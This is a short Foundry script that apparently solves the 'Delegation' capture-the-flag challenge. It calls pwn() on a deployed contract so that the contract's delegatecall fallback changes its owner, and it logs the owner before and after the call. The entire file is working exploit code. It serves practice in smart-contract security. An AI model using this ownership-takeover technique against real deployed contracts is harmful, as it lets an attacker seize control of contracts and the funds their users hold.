pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../challs/Delegate.sol";

contract DelegateSolver is Script{
    function run() external {
        vm.startBroadcast();
        
        Delegation d = Delegation(0xDeCfFFa0Fe96702Ed05BBE89c95eC28d97F09eF8);
        console.log("before owner: ");
        console.log(d.owner());
        address(d).call{value: 0}(abi.encodeWithSignature("pwn()"));
        console.log("after owner: ");
        console.log(d.owner());
    }    
}